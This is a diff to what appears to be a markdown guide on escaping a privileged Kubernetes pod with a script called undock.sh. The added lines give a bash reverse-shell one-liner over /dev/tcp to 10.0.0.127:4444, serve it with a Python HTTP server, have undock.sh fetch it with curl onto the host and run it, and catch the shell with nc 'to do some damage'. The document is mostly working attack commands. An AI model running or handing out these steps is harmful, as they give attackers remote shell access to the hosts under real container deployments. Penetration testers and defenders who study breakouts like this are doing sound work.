@@ -190,12 +190,19 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
 
 ### Option 3: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
 
+#### Create a payload and host it on your remote box
+```bash
+echo "0<&209-;exec 209<>/dev/tcp/10.0.0.127/4444;sh <&209 >&209 2>&209" > rshell.sh
+python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+#### Use undock.sh to download the script to the host and then execute it in the context of the host
 ```bash
 root@pod-priv:/# sh undock.sh "curl -sL http://10.0.0.127:8000/rshell.sh -o /tmp/rshell.sh"
 root@pod-priv:/# sh undock.sh "bash -c /tmp/rshell.sh"
 ```
 
-### Catch the shell, do some damage
+#### Catch the shell, do some damage
 ```bash
 nc -nvlp 4444
 listening on [any] 4444 ...
